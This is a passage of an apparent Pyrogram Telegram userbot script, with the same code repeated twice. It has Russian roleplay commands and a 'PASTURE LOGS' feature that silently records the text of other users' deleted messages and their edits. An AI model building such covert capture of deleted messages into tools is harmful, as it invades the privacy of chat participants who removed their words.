    "улыбнуться": "тепло улыбнулся(ась) 😊",
    "танец": "начал(а) зажигательный танец 🕺",
    "укусить": "игриво укусил(а) 🦷",
    "ударить": "резко ударил(а) 💢",
    "пнуть": "аккуратно пнул(а) 👟",
    "помахать": "помахал(а) рукой 👋",
    "заплакать": "горько заплакал(а) 😢"
}

@app.on_message(filters.command(list(RP_ACTIONS.keys()), prefixes="+") & filters.me)
async def rp_handler(client, message):
    action = message.command[0]
    target = message.reply_to_message.from_user.mention if message.reply_to_message and message.reply_to_message.from_user else "воздух"
    text = f"*{message.from_user.mention} {RP_ACTIONS[action]} {target}*"
    await message.edit(text)

# ================= PASTURE LOGS (Перехват удалений) =================
LOGS_ENABLED = True

@app.on_deleted_messages()
async def logs_deleted(client, messages):
    if not LOGS_ENABLED:
        return
    for msg in messages:
        logging.info(f"[PASTURE LOGS] Удалено сообщение в чате {msg.chat.id}: {msg.text}")

@app.on_edited_message()
async def logs_edited(client, message):
    if not LOGS_ENABLED or not message.from_user or message.from_user.is_self:
        return
    logging.info(f"[PASTURE LOGS] Отредактировано сообщение от {message.from_user.id}: {message.text}")
RP_ACTIONS = {
    "погладить": "погладил(а) с теплом ✨",
    "обнять": "крепко обнял(а) 🤗",
    "поцеловать": "нежно поцеловал(а) 💋",
    "прижать": "прижал(а) к себе 🫂",
    "покормить": "покормил(а) вкусняшкой 🍰",
    "улыбнуться": "тепло улыбнулся(ась) 😊",
    "танец": "начал(а) зажигательный танец 🕺",
    "укусить": "игриво укусил(а) 🦷",
    "ударить": "резко ударил(а) 💢",
    "пнуть": "аккуратно пнул(а) 👟",
    "помахать": "помахал(а) рукой 👋",
    "заплакать": "горько заплакал(а) 😢"
}

@app.on_message(filters.command(list(RP_ACTIONS.keys()), prefixes="+") & filters.me)
async def rp_handler(client, message):
    action = message.command[0]
    target = message.reply_to_message.from_user.mention if message.reply_to_message and message.reply_to_message.from_user else "воздух"
    text = f"*{message.from_user.mention} {RP_ACTIONS[action]} {target}*"
    await message.edit(text)
LOGS_ENABLED = True

@app.on_deleted_messages()
async def logs_deleted(client, messages):
    if not LOGS_ENABLED:
        return
    for msg in messages:
        logging.info(f"[PASTURE LOGS] Удалено сообщение в чате {msg.chat.id}: {msg.text}")

@app.on_edited_message()
async def logs_edited(client, message):
    if not LOGS_ENABLED or not message.from_user or message.from_user.is_self:
        return
    logging.info(f"[PASTURE LOGS] Отредактировано сообщение от {message.from_user.id}: {message.text}")

